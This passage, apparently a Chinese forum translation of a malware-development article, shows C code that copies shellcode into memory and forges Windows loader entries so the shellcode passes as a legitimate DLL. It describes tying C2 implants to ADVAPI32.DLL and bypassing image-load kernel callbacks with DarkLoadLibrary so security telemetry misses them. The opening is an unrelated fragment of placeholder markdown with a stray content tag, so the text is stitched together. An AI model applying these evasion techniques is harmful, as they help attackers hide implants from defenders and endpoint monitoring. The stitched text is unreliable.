
进入`/path/to/xxx`目录，找到`xxx.json`。

在表达式`cvar = avar + bvar`中，加法运算符（`+`）将`avar`与`bvar`相加，得到它们的和`cvar`

在`List.of(arg0, arg1, arg2)`中，`List`接口的工厂方法`of()`接受一系列的元素，返回包含它们的只读列表。

之后我们这样调用`cmd`命令：`cmd arg0 arg1 arg2`。

```
if (condVar > someVal) {console.log("xxx")}
```
[/content]

[content]
| 1 | `status` `=` `NtQuerySystemTime(&pLdrEntry2- >LoadTime);` |

- 加载原因 (`[LDR_DLL_LOAD_REASON](https://bbs.kanxue.com/elink@8e9K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4k6h3u0Q4x3X3g2S2M7X3y4Z5K9i4k6W2i4K6u0W2L8%4u0Y4i4K6u0r3N6$3g2T1i4K6u0r3x3U0l9J5x3U0p5I4x3U0j5I4z5o6t1#2x3K6y4E0M7q4)9#2k6W2)9J5c8X3S2@1N6s2m8K6i4K6y4m8i4K6u0r3i4K6u0r3k6$3W2@1K9s2g2T1i4K6u0W2j5$3!0E0i4K6u0r3M7s2u0G2j5$3g2K6M7$3S2S2j5$3E0W2M7W2)9J5c8Y4m8Z5L8Y4c8Q4x3V1k6T1L8r3!0T1i4K6u0r3y4o6j5I4k6U0N6T1y4U0b7$3x3X3u0T1y4r3x3^5x3e0b7#2x3U0M7#2y4K6t1K6x3X3g2S2j5h3p5@1x3h3t1I4y4X3u0W2y4e0W2S2y4q4)9J5c8X3&6@1L8r3c8J5i4K6u0W2K9q4)9J5x3@1H3^5y4H3`.`.))`：

|  |  |

| --- | --- |

| 1 | `pLdrEntry2- >LoadReason` `=` `LoadReasonDynamicLoad;` |

- 因为加载程序需要一个模块的基地址，我们将在这里加载 `CALC.EXE` 的 shellcode（我们稍后会更详细讨论这部分）：

|  |  |

| --- | --- |

| 1  2  3 | `SIZE_T bufSz` `=` `sizeof(buf);`  `LPVOID pAddress` `=` `VirtualAllocEx(hProcess,` `0``, bufSz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);`  `memcpy(pAddress, buf, sizeof(buf));` |

- 哈希的基本名称 (`[RtlHashUnicodeString](https://bbs.kanxue.com/elink@cb9K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4k6h3u0Q4x3X3g2S2M7X3y4Z5K9i4k6W2i4K6u0W2L8%4u0Y4i4K6u0r3N6$3g2T1i4K6u0r3x3U0l9J5x3U0p5I4x3U0j5I4z5o6t1#2x3K6y4Q4x3V1k6Z5N6s2c8H3M7#2)9K6b7g2)9J5c8W2)9J5c8Y4m8J5k6g2)9J5k6h3g2E0M7s2c8Q4x3X3g2V1k6i4k6Q4x3V1k6H3L8%4y4@1M7#2)9J5c8X3#2S2k6h3I4K6N6s2u0G2L8g2)9J5k6r3g2V1M7W2)9J5k6r3E0W2M7X3&6W2L8q4)9J5k6r3y4S2L8r3I4T1j5h3y4C8M7#2)9J5k6r3S2G2L8$3E0K6i4K6u0V1j5h3&6V1i4K6u0V1j5$3q4D9L8s2y4@1j5h3y4C8M7#2)9J5c8W2u0@1L8p5S2S2M7$3S2g2L8X3W2U0L8$3c8W2f1%4c8J5K9h3&6Y4))`：

|  |  |

| --- | --- |

| 1 | `pLdrEntry2- >BaseNameHashValue` `=` `UnicodeToHash(uFileName, FALSE);` |

填写结构的其余部分：

|  |  |

| --- | --- |

| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15 | `pLdrEntry2- >ImageDll` `=` `TRUE;`  `pLdrEntry2- >LoadNotificationsSent` `=` `TRUE;`  `pLdrEntry2- >EntryProcessed` `=` `TRUE;`  `pLdrEntry2- >InLegacyLists` `=` `TRUE;`  `pLdrEntry2- >InIndexes` `=` `TRUE;`  `pLdrEntry2- >ProcessAttachCalled` `=` `TRUE;`  `pLdrEntry2- >InExceptionTable` `=` `FALSE;`  `pLdrEntry2- >OriginalBase` `=` `(ULONG_PTR)pAddress;`  `pLdrEntry2- >DllBase` `=` `pAddress;`  `pLdrEntry2- >SizeOfImage` `=` `6969``;`  `pLdrEntry2- >TimeDateStamp` `=` `0``;`  `pLdrEntry2- >BaseDllName` `=` `uFileName;`  `pLdrEntry2- >FullDllName` `=` `uFullPath;`  `pLdrEntry2- >ObsoleteLoadCount` `=` `1``;`  `pLdrEntry2- >Flags` `=` `LDRP_IMAGE_DLL | LDRP_ENTRY_INSERTED | LDRP_ENTRY_PROCESSED | LDRP_PROCESS_ATTACH_CALLED;` |

- 完成`DdagNode`结构：

![图片描述](https://bbs.kanxue.com/upload/attach/202308/876202_3UGRKSSBMBMT8G2.png)

|  |  |

| --- | --- |

| 1  2  3  4  5  6  7  8  9  10  11  12 | `pLdrEntry2- >DdagNode` `=` `(PLDR_DDAG_NODE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(LDR_DDAG_NODE));`  `if` `(!pLdrEntry2- >DdagNode)`  `{`  `return` `-``1``;`  `}`    `pLdrEntry2- >NodeModuleLink.Flink` `=` `&pLdrEntry2- >DdagNode- >Modules;`  `pLdrEntry2- >NodeModuleLink.Blink` `=` `&pLdrEntry2- >DdagNode- >Modules;`  `pLdrEntry2- >DdagNode- >Modules.Flink` `=` `&pLdrEntry2- >NodeModuleLink;`  `pLdrEntry2- >DdagNode- >Modules.Blink` `=` `&pLdrEntry2- >NodeModuleLink;`  `pLdrEntry2- >DdagNode- >State` `=` `LdrModulesReadyToRun;`  `pLdrEntry2- >DdagNode- >LoadCount` `=` `1``;` |

这是它的实际应用：

![图片描述](https://bbs.kanxue.com/upload/attach/202308/876202_6QRG6NQV3NRRD7Y.png)

（在原文中是一个动图）

在上述示例中，可以看到`CertEnroll.dll`加载在`spoof-load.exe`进程中。请记住，这并没有真正加载。这里发生的唯一事情是传递了一个DLL的字符串。然后我们告诉加载程序，DLL的基地址就是shellcode的基地址：

![图片描述](https://bbs.kanxue.com/upload/attach/202308/876202_QVTSUHF6EKRUVE2.png)

(在原文中是一个动图)

从这种技术来看，有两个明显的用例：

- 将植入物的基地址（C2IMPLANT.REFLECTIVE.DLL）与合法的DLL（ADVAPI32.DLL）关联起来，使其看起来不那么可疑。

- 通过加载ADVAPI32.DLL，但将其指向WinHTTP.DLL的基地址，从而移除一个IOC库（WinHTTP.DLL）。

### 绕过回调

在这里，我们不会重新发明轮子，这个概念在《[Bypassing Image Load Kernel Callbacks](https://bbs.kanxue.com/elink@d0bK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4k6h3u0Q4x3X3g2S2M7X3y4Z5K9i4k6W2i4K6u0W2L8%4u0Y4i4K6u0r3N6$3g2T1i4K6u0r3x3U0l9J5x3U0p5I4x3U0j5I4z5o6t1#2x3K6y4E0M7q4)9#2k6W2)9J5c8X3S2@1N6s2m8K6i4K6y4m8i4K6u0r3i4K6u0r3N6%4N6%4i4K6u0W2L8h3c8K6k6h3y4Q4x3X3g2U0L8#2)9J5k6i4g2C8i4K6u0r3x3U0l9J5x3g2)9J5c8U0l9$3i4K6u0r3j5Y4W2H3j5i4y4K6K9h3&6Y4i4K6u0V1K9h3#2S2k6$3g2Q4x3X3c8D9L8$3q4V1i4K6u0V1K9$3g2J5L8X3g2D9i4K6u0V1j5$3q4D9L8r3u0S2j5$3E0K6i4K6u0r3)》中有很好的解释。基本上，为了防止回调触发，需要重新编写一个完整的加载器。该研究的结论是[`DarkLoadLibrary`](https://bbs.kanxue.com/elink@b55K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4k6h3u0Q4x3X3g2S2M7X3y4Z5K9i4k6W2i4K6u0W2L8%4u0Y4i4K6u0r3N6$3g2T1i4K6u0r3x3U0l9J5x3U0p5I4x3U0j5I4z5o6t1#2x3K6y4E0M7q4)9#2k6W2)9J5c8X3S2@1N6s2m8K6i4K6y4m8i4K6u0r3i4K6u0r3k6$3W2@1K9s2g2T1i4K6u0W2j5$3!0E0i4K6u0r3j5X3q4@1M7K6y4U0i4K6u0r3c8r3q4J5K9@1I4G2j5h3c8x3K9h3u0J5j5i4u0&6)：

> 实质上，`DarkLoadLibrary`是`LoadLibrary`的一种实现，它不会触发映像加载事件。它还具有许多额外的功能，可以在恶意软件开发过程中更加方便。

这个库的概念验证用法来自于[`DLL Shenanigans`](https://bbs.kanxue.com/elink@6ceK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4k6h3u0Q4x3X3g2S2M7X3y4Z5K9i4k6W2i4K6u0W2L8%4u0Y4i4K6u0r3N6$3g2T1i4K6u0r3x3U0l9J5x3U0p5I4x3U0j5I4z5o6t1#2x3K6y4E0M7q4)9#2k6W2)9J5c8X3S2@1N6s2m8K6i4K6y4m8i4K6u0r3i4K6u0r3k6$3W2@1K9s2g2T1i4K6u0W2j5$3!0E0i4K6u0r3L8h3g2*7i4K6u0V1x3q4)9J5c8Y4m8S2L8Y4c8J5P5g2)9J5c8Y4c8J5k6h3g2Q4x3V1k6E0j5h3W2F1i4K6u0r3j5%4m8H3i4K6u0r3k6r3I4D9i4K6u0V1M7$3S2W2L8X3q4F1K9h3N6S2L8Y4x3`.)。

让我们来检查一下：

![图片描述](https://bbs.kanxue.com/upload/attach/202308/876202_ARC3RNQ2F9FPB88.png)

然后执行上述3个命令：

- `dark-loader`使用`LOAD_LOCAL_FILE`标志从磁盘加载文件，与`LoadLibraryA`相同。

- 搜索映像加载日志以确保找到日志。

- 搜索winhttp.dll，但没有返回结果。

为了避免调用被识别为注册回调的`NtCreateSection`，使用`NtAllocateVirtualMemory`或`VirtualAlloc`进行部分映射，就像在[`MapSections()`](https://bbs.kanxue.com/elink@492K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4k6h3u0Q4x3X3g2S2M7X3y4Z5K9i4k6W2i4K6u0W2L8%4u0Y4i4K6u0r3N6$3g2T1i4K6u0r3x3U0l9J5x3U0p5I4x3U0j5I4z5o6t1#2x3K6y4E0M7q4)9#2k6W2)9J5c8X3S2@1N6s2m8K6i4K6y4m8i4K6u0r3i4K6u0r3k6$3W2@1K9s2g2T1i4K6u0W2j5$3!0E0i4K6u0r3j5X3q4@1M7K6y4U0i4K6u0r3c8r3q4J5K9@1I4G2j5h3c8x3K9h3u0J5j5i4u0&6i4K6u0r3j5X3I4G2j5W2)9J5c8U0l9@1y4$3p5H3j5U0m8T1k6U0q4V1y4U0f1#2y4o6M7H3k6e0m8U0y4K6m8W2x3U0b7%4x3K6f1J5j5X3u0S2x3h3p5%4y4o6S2U0j5X3y4Q4x3V1k6p5j5i4u0C8e0r3!0S2k6p5I4A6j5Y4u0S2M7Y4W2Q4x3V1k6K6M7X3y4Q4x3V1k6D9k6s2u0#2N6r3W2D9M7#2)9J5k6h3y4Q4x3U0y4x3x3U0j5`.)中看到的那样。

### 内核回调结论

显然，`PsSetLoadImageNotifyRoutine`并不是唯一的回调函数，还有许多其他回调函数可供使用。《[Kernel Callback Functions](https://bbs.kanxue.com/elink@688K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4k6h3u0Q4x3X3g2S2M7X3y4Z5K9i4k6W2i4K6u0W2L8%4u0Y4i4K6u0r3N6$3g2T1i4K6u0r3x3U0l9J5x3U0p5I4x3U0j5I4z5o6t1#2x3K6y4E0M7q4)9#2k6W2)9J5c8X3S2@1N6s2m8K6i4K6y4m8i4K6u0r3i4K6u0r3j5$3!0V1k6h3#2S2j5$3S2A6L8X3g2Q4x3X3g2U0L8$3#2Q4x3V1k6S2M7Y4c8A6j5$3I4W2M7#2)9J5c8X3E0W2M7X3&6W2L8q4)9#2k6X3y4S2L8r3I4T1j5h3y4C8i4K6g2X3k6Y4g2F1j5%4c8A6L8$3&6K6i4K6u0W2K9s2c8E0L8l9`.`.)》提供了一个（非详尽！）的列表：

- `CmRegisterCallbackEx()`

- `ExAllocateTimer()`

- `ExInitializeWorkItem()`

- `ExRegisterCallback()`

- `FsRtlRegisterFileSystemFilterCallbacks()`

- `IoInitializeThreadedDpcRequest()`

- `IoQueueWorkItem()`

- `IoRegisterBootDriverCallback()`

- `IoRegisterContainerNotification()`

- `IoRegisterFsRegistrationChangeEx()`

- `IoRegisterFsRegistrationChangeMountAware()`

- `IoRegisterPlugPlayNotification()`

- `IoSetCompletionRoutineEx()`

- `IoWMISetNotificationCallback()`

- `KeExpandKernelStackAndCalloutEx()`

- `KeInitializeApc()`

- `KeInitializeDpc()`

- `KeRegisterBugCheckCallback()`

- `KeRegisterBugCheckReasonCallback()`

- `KeRegisterNmiCallback()`

- `KeRegisterProcessorChangeCallback()`

- `KeRegisterProcessorChangeCallback()`

- `ObRegisterCallbacks()`

- `PoRegisterDeviceNotify()`

- `PoRegisterPowerSettingCallback()`

- `PsCreateSystemThread()`

- `PsSetCreateProcessNotifyRoutineEx()`

- `PsSetCreateThreadNotifyRoutine()`

- `PsSetLoadImageNotifyRoutine()`

- `SeRegisterLogonSessionTerminatedRoutine()`

- `TmEnableCallbacks()`

其中一个强大的回调函数是`PsSetCreateProcessNotifyRoutineEx()`，因为进程创建的通知对于系统遥测来说将是致命的。截至撰写本文时，我们还没有注意到在这个领域有任何研究。尽管坦率地说，我们还没有进行过深入的调查。

## 钩取和进程仪器化

在本节中，我们将介绍一些流行但基础的Hooking技术。

### 钩取示例
